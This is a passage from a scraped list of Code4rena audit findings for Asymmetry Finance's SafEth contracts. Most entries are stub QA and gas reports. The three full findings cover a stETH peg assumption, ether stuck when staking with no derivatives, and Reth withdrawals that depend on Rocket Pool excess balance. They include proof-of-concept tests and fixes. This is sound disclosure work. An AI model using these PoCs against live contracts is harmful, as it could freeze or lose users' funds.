charth](https://nomics.com/exchanges/curve-curve-finance-ethereum/markets/0xae7ab96520de3a18e5e111b5eaab095312d7fe84-0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee) or [this dashboard](https://dune.com/LidoAnalytical/Curve-ETHstETH). There have been many episodes of market volatility that affected the price of stETH, notably the one in last June when stETH traded at ~0.93 ETH.  The first indication of such an assumption is the implementation of `ethPerDerivative`. This function is intended to work as an estimation of the current value in ETH of one unit (1e18) of the underlying asset. In this implementation, the function simply queries the amount of stETH for one unit (1e18) of wstETH and returns that value, which clearly indicates a conversion rate of 1 stETH = 1 ETH.  https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L86-L88  ```solidity function ethPerDerivative(uint256 _amount) public view returns (uint256) {     return IWStETH(WST_ETH).getStETHByWstETH(10 ** 18); } ```  The other indication and most critical one is in the `withdraw` function. This function is used by the `SafEth` contract to unstake user positions and rebalance weights. In the implementation for the `WstEth` derivative, the function will unwrap the wstETH for stETH and use the Curve pool to exchange the stETH for ETH:  https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L56-L67  ```solidity 56:     function withdraw(uint256 _amount) external onlyOwner { 57:         IWStETH(WST_ETH).unwrap(_amount); 58:         uint256 stEthBal = IERC20(STETH_TOKEN).balanceOf(address(this)); 59:         IERC20(STETH_TOKEN).approve(LIDO_CRV_POOL, stEthBal); 60:         uint256 minOut = (stEthBal * (10 ** 18 - maxSlippage)) / 10 ** 18; 61:         IStEthEthPool(LIDO_CRV_POOL).exchange(1, 0, stEthBal, minOut); 62:         // solhint-disable-next-line 63:         (bool sent, ) = address(msg.sender).call{value: address(this).balance}( 64:             \"\" 65:         ); 66:         require(sent, \"Failed to send Ether\"); 67:     } ```  The issue is the calculation of the `minOut` variable that is sent to the Curve `exchange` function to validate the output amount of the trade. As we can see in line 60, the calculation is simply applying the slippage percentage to stETH balance. This means that for example, given the default slippage value of 1%, trading 1 stETH will succeed only if the rate is above 0.99. Larger amounts will be more concerning as the Curve AMM implements non-linear invariants, the price impact will be bigger. The `rebalanceToWeights` function withdraws **all the balance** before rebalancing, which means it will try to swap all the stETH held by the contract.  This could be mitigated by adjusting the `maxSlippage` variable to allow for lower exchange rates. However this would imply additional issues. First, the `setMaxSlippage` is an admin function that needs to be manually updated with extreme care. In times of high volatility the owners won't be able to update this variable as frequently as needed to keep up with the exchange rate. This means that users that want to exit their position won't be able to do so since the exchange for this derivative will fail (see PoC for a detailed example). Second, on the contrary, if the owners decide to set a higher slippage value by default to allow for unexpected market conditions, withdrawals and rebalancing (in particular) will be victim of sandwich attacks by MEV bots.  ## Proof of Concept  The following test replicates the market conditions during last June where stETH was trading at 0.93 ETH (needs to be forked from mainnet at block ~15000000). Here, the user wants to exit their position but the call to `unstake` will revert since the exchange in the Curve pool will fail as the output amount will be less than the expected minimum.  Note: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/a2895a85360276cf4f29d23de3282859).  ```solidity // Run this test forking mainnet at block height 15000000 function test_WstEth_withdraw_AssumesPegToEth() public {     // Setup derivative     vm.prank(deployer);     safEth.addDerivative(address(wstEth), 1e18);      // Deal balance to user     uint256 depositValue = 1 ether;     vm.deal(user, depositValue);      // user stakes ether     vm.prank(user);     safEth.stake{value: depositValue}();      // user tries to unstake, action will fail due to stETH being prices at around 0.93-0.95 ETH     uint256 userShares = safEth.balanceOf(user);     vm.prank(user);     vm.expectRevert(\"Exchange resulted in fewer coins than expected\");     safEth.unstake(userShares); } ```  ## Recommendation  The user should be able to decide on the slippage and set the expected minimum output amount to correctly handle different market conditions and user expectations. Similar to how decentralized exchanges work, the user experience can be improved by using a front-end that queries current exchange rates and offers the user a preview of the estimated output amount.  The `ethPerDerivative` function should also take into account the results of swapping the stETH for ETH using the Curve pool, similar to how the `SfrxEth` derivative implementation works. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/496", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-45"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/0xAgro-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/487", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-84"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/brevis-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/463", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-87"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/peanuts-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/462", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-88"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/UdarTeam-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/459", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-89"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/juancito-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/450", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "edited-by-warden", "G-33"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/JCN-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/409", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-94"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/0xTraub-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/406", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-36"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/smaul-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/400", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-37"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/MiniGlome-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/387", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-97"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Gde-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/379", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-99"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/arialblack14-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/377", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-85"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/catellatech-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/373", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-100"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/fatherOfBlocks-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/372", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-38"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/fatherOfBlocks-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/371", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-39"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/HHK-G.md)."}, {"title": "Stuck ether when use function `stake` with empty `derivatives`(`derivativeCount` = 0)", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/363", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-10"], "target": "2023-03-asymmetry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L84-L96   # Vulnerability details  ### Impact  After `initialize` the contract `SafEth`, if someone call `stake` before `addDerivative`, the function `stake` skip the two for cycles because the `derivativeCount` is equal to `0` and don't `deposit` in the `derivative` contract also mint `0` tokens to the sender. Finally the amount of `msg.value` will stuck in the contract  ### Proof of Concept  ```typescript /* eslint-disable new-cap */ import { network, upgrades, ethers } from \"hardhat\"; import { expect } from \"chai\"; import { SignerWithAddress } from \"@nomiclabs/hardhat-ethers/signers\"; import { SafEth } from \"../typechain-types\";  describe(\"stake tests\", function () {   let adminAccount: SignerWithAddress;   let safEthProxy: SafEth;   const depositAmount = ethers.utils.parseEther(\"200\");    before(async () => {     const latestBlock = await ethers.provider.getBlock(\"latest\");      await network.provider.request({       method: \"hardhat_reset\",       params: [{forking: {         jsonRpcUrl: process.env.MAINNET_URL,         blockNumber: latestBlock.number,       }}],     });      const accounts = await ethers.getSigners();     adminAccount = accounts[0];      safEthProxy = await upgrades.deployProxy(       await ethers.getContractFactory(\"SafEth\"),       [         \"Asymmetry Finance ETH\",         \"safETH\",       ]     ) as SafEth;     await safEthProxy.deployed();   });    it(\"PoC: don't have derivatives\", async function () {     // Check: don't have derivatives     expect(await safEthProxy.derivativeCount()).eq(0);      // This transaction should revert     await safEthProxy.stake({ value: depositAmount });      const ethBal = await ethers.provider.getBalance(safEthProxy.address);     const stakerBal = await safEthProxy.balanceOf(adminAccount.address);     // This log 200 ether, but should be 0     console.log(\"safEthProxy Balance:\", ethBal.toString());     // The staker has 0 tokens     console.log(\"staker Balance:\", stakerBal.toString());   }); }); ```  ### Tools Used  Review  ### Recommended Mitigation Steps  When stake the `derivativeCount` should be greater than `0`:  ```solidity @@ -64,6 +64,7 @@ contract SafEth is          require(pauseStaking == false, \"staking is paused\");          require(msg.value >= minAmount, \"amount too low\");          require(msg.value <= maxAmount, \"amount too high\"); +        require(derivativeCount > 0, \"derivativeCount is zero\");           uint256 underlyingValue = 0; ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/361", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-40"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/arialblack14-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/358", "labels": ["bug", "G (Gas Optimization)", "grade-b", "low quality report", "sponsor confirmed", "G-41"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/anodaram-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/356", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-101"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Dug-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/352", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-102"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/ks__xxxxx-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/325", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-105"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Rappie-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/321", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-104"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Ignite-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/319", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-106"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/DadeKuma-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/313", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-107"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/ck-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/311", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-108"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/lopotras-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/300", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-111"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Rickard-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/299", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-42"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Rickard-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/281", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-114"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/codeslide-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/280", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-43"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/codeslide-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/277", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-115"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/0x3b-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/274", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-44"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/0x3b-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/273", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-116"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/bin2chen-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/244", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-119"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/T1MOH-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/235", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "sponsor confirmed", "G-45"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Rolezn-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/234", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-120"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Rolezn-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/227", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-46"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/0xGordita-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/213", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-121"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/descharre-Q.md)."}, {"title": "Reth.sol: Withdrawals are unreliable and depend on excess RocketDepositPool balance which can brick the whole protocol", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/210", "labels": ["bug", "3 (High Risk)", "disagree with severity", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "H-07"], "target": "2023-03-asymmetry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L107-L114   # Vulnerability details  ## Impact The Asymmetry protocol promises that a user can call [`SafETH.unstake`](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L108-L129) at all times. What I mean by that is that a user should be able at all times to burn his `SafETH` tokens and receive `ETH` in return. This requires that the derivatives held by the protocol can at all times be withdrawn (i.e. converted to `ETH`).    Also the [`rebalanceToWeights`](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L138-L155) functionality requires that the derivatives can be withdrawn at all times. If a derivative cannot be withdrawn then the `rebalanceToWeights` function cannot be executed which means that the protocol cannot be adjusted to use different derivatives.    For the `WstEth` and `SfrxEth` derivatives this is achieved by swapping the derivative in a Curve pool for `ETH`. The liquidity in the respective Curve pool ensures that withdrawals can be processed at all times.    The `Reth` derivative works differently.   Withdrawals are made by calling the `RocketTokenRETH.burn` function:    [Link](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L107-L114)   ```solidity function withdraw(uint256 amount) external onlyOwner {     // @audit this is how rETH is converted to ETH     RocketTokenRETHInterface(rethAddress()).burn(amount);     // solhint-disable-next-line     (bool sent, ) = address(msg.sender).call{value: address(this).balance}(         \"\"     );     require(sent, \"Failed to send Ether\"); } ```  The issue with this is that the `RocketTokenRETH.burn` function only allows for _excess balance_ to be withdrawn. I.e. ETH that has been deposited by stakers but that is not yet staked on the Ethereum beacon chain. So Rocketpool allows users to burn `rETH` and withdraw `ETH` as long as the excess balance is sufficient.    The issue is obvious now: If there is no excess balance because enough users burn `rETH` or the Minipool capacity increases, the Asymmetry protocol is bascially unable to operate.    Withdrawals are then impossible which bricks `SafEth.unstake` and `SafEth.rebalanceToWeights`.    ## Proof of Concept I show in this section how the current withdrawal flow for the `Reth` derivative is dependend on there being _excess balance_ in the RocketDepositPool.    The current withdrawal flow calls `RocketTokenRETH.burn` which executes this code:    [Link](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L106-L123)   ```solidity function burn(uint256 _rethAmount) override external {     // Check rETH amount     require(_rethAmount > 0, \"Invalid token burn amount\");     require(balanceOf(msg.sender) >= _rethAmount, \"Insufficient rETH balance\");     // Get ETH amount     uint256 ethAmount = getEthValue(_rethAmount);     // Get & check ETH balance     uint256 ethBalance = getTotalCollateral();     require(ethBalance >= ethAmount, \"Insufficient ETH balance for exchange\");     // Update balance & supply     _burn(msg.sender, _rethAmount);     // Withdraw ETH from deposit pool if required     withdrawDepositCollateral(ethAmount);     // Transfer ETH to sender     msg.sender.transfer(ethAmount);     // Emit tokens burned event     emit TokensBurned(msg.sender, _rethAmount, ethAmount, block.timestamp); } ```  This executes `withdrawDepositCollateral(ethAmount)`:    [Link](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L126-L133)    ```solidity function withdrawDepositCollateral(uint256 _ethRequired) private {     // Check rETH contract balance     uint256 ethBalance = address(this).balance;     if (ethBalance >= _ethRequired) { return; }     // Withdraw     RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface(getContractAddress(\"rocketDepositPool\"));     rocketDepositPool.withdrawExcessBalance(_ethRequired.sub(ethBalance)); } ```  This then calls `rocketDepositPool.withdrawExcessBalance(_ethRequired.sub(ethBalance))` to get the `ETH` from the _excess balance_:    [Link](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/deposit/RocketDepositPool.sol#L194-L206)   ```solidity function withdrawExcessBalance(uint256 _amount) override external onlyThisLatestContract onlyLatestContract(\"rocketTokenRETH\", msg.sender) {     // Load contracts     RocketTokenRETHInterface rocketTokenRETH = RocketTokenRETHInterface(getContractAddress(\"rocketTokenRETH\"));     RocketVaultInterface rocketVault = RocketVaultInterface(getContractAddress(\"rocketVault\"));     // Check amount     require(_amount <= getExcessBalance(), \"Insufficient excess balance for withdrawal\");     // Withdraw ETH from vault     rocketVault.withdrawEther(_amount);     // Transfer to rETH contract     rocketTokenRETH.depositExcess{value: _amount}();     // Emit excess withdrawn event     emit ExcessWithdrawn(msg.sender, _amount, block.timestamp); } ```  And this function reverts if the _excess balance_ is insufficient which you can see in the `require(_amount <= getExcessBalance(), \"Insufficient excess balance for withdrawal\");` check.    ## Tools Used VSCode  ## Recommended Mitigation Steps The solution for this issue is to have an alternative withdrawal mechanism in case the _excess balance_ in the RocketDepositPool is insufficient to handle the withdrawal.    The alternative withdrawal mechanism is to sell the `rETH` tokens via the Uniswap pool.    You can use the [`RocketDepositPool.getExcessBalance`](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/deposit/RocketDepositPool.sol#L59-L67) to check if there is sufficient excess `ETH` to withdraw from Rocketpool or if the withdrawal must be made via Uniswap.    The pseudocode of the new withdraw flow looks like this:   ``` function withdraw(uint256 amount) external onlyOwner {     if (rocketDepositPool excess balance is sufficient) {         RocketTokenRETHInterface(rethAddress()).burn(amount);         // solhint-disable-next-line         (bool sent, ) = address(msg.sender).call{value: address(this).balance}(             \"\"         );         require(sent, \"Failed to send Ether\");     } else {         // swap rETH for ETH via Uniswap pool     } } ```  I also wrote the code for the changes that I suggest:   ```diff diff --git a/contracts/SafEth/derivatives/Reth.sol b/contracts/SafEth/derivatives/Reth.sol index b6e0694..b699d5c 100644 --- a/contracts/SafEth/derivatives/Reth.sol +++ b/contracts/SafEth/derivatives/Reth.sol @@ -105,11 +105,24 @@ contract Reth is IDerivative, Initializable, OwnableUpgradeable {          @notice - Convert derivative into ETH       */      function withdraw(uint256 amount) external onlyOwner { -        RocketTokenRETHInterface(rethAddress()).burn(amount); -        // solhint-disable-next-line -        (bool sent, ) = address(msg.sender).call{value: address(this).balance}( -            \"\" -        ); +        if (canWithdrawFromRocketPool(amount)) { +            RocketTokenRETHInterface(rethAddress()).burn(amount); +            // solhint-disable-next-line +        } else { + +            uint256 minOut = ((((poolPrice() * amount) / 10 ** 18) * +                ((10 ** 18 - maxSlippage))) / 10 ** 18); + +            IWETH(W_ETH_ADDRESS).deposit{value: msg.value}(); +            swapExactInputSingleHop( +                rethAddress(), +                W_ETH_ADDRESS, +                500, +                amount, +                minOut +            ); +        } +        (bool sent, ) = address(msg.sender).call{value: address(this).balance}(\"\");          require(sent, \"Failed to send Ether\");      }   @@ -149,6 +162,21 @@ contract Reth is IDerivative, Initializable, OwnableUpgradeable {              _amount >= rocketDAOProtocolSettingsDeposit.getMinimumDeposit();      }   +    function canWithdrawFromRocketPool(uint256 _amount) private view returns (bool) { +        address rocketDepositPoolAddress = RocketStorageInterface( +            ROCKET_STORAGE_ADDRESS +        ).getAddress( +                keccak256( +                    abi.encodePacked(\"contract.address\", \"rocketDepositPool\") +                ) +            ); +        RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface( +                rocketDepositPoolAddress +            ); +        uint256 _ethAmount = RocketTokenRETHInterface(rethAddress()).getEthValue(_amount); +        return rocketDepositPool.getExcessBalance() >= _ethAmount; +    } + ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/208", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-122"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/roelio-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/206", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-112"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/0xNorman-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/190", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-123"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/Brenzee-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/185", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-124"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/HollaDieWaldfee-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/181", "labels": ["bug", "grade-a", "low quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-127"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/ernestognw-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/179", "labels": ["bug", "G (Gas Optimization)", "grade-b", "low quality report", "sponsor confirmed", "G-47"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/ernestognw-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/178", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "edited-by-warden", "G-48"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/dicethedev-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/167", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-129"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report 